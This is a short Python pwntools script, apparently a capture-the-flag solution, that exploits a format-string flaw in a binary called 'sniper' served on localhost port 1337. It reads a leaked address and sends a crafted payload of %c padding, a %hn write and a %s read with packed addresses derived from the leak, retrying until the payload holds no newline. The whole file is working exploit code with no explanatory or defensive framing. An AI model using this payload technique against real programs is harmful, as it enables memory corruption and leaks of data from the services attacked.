from pwn import *
elf = ELF("sniper")
context.log_level = "debug"
context.binary = elf
# p = process()

while True:
    p = remote("localhost", 1337)
    # p = process()
    leak = int(p.recvline(), 16)
    #           1 2 3 4 5 6 7 8 9     10 11
    #           V V V V V V V V V     V  V
    payload = b"%c%c%c%c%c%c%c%c%2562c%hn%sAAAAA" + p64(leak + 42) + p64(0)
    #           ^       ^       ^       ^           ^                ^
    #           0       8       16      24          32               40
    #           6       7       8       9           10               11
    if b"\n" in payload:
        p.close()
        continue

    p.sendline(payload)
    res = p.recvline()
    print(res)
    p.close()
    break
